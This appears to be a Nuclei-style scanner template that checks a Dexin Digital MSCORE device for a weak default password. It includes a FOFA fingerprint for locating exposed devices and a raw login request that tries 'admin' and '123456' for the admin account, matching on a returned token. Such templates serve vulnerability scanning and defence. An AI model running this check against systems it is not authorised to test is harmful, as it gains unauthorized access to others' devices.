id: poc-yaml-dsdvb-mscore-weak-password
info:
  name: 德芯数字 MSCORE 弱口令漏洞
  author: ProjectDiscoveryAI
  severity: medium
  tags: weak-password
  metadata:
    finger: mscore
    fofa: icon_hash="-592805355"

variables:
  passwd:
    - admin
    - 123456

http:
  - raw:
      - |
        POST /3508gw/api/user/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        password={{passwd}}&remember=false&username=admin
    payloads:
      passwd:
        - "admin"
        - "123456"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "success"
          - "\"username\":\"admin\""
          - "\"token\":"
      - type: word
        part: header
        words:
          - "application/json"
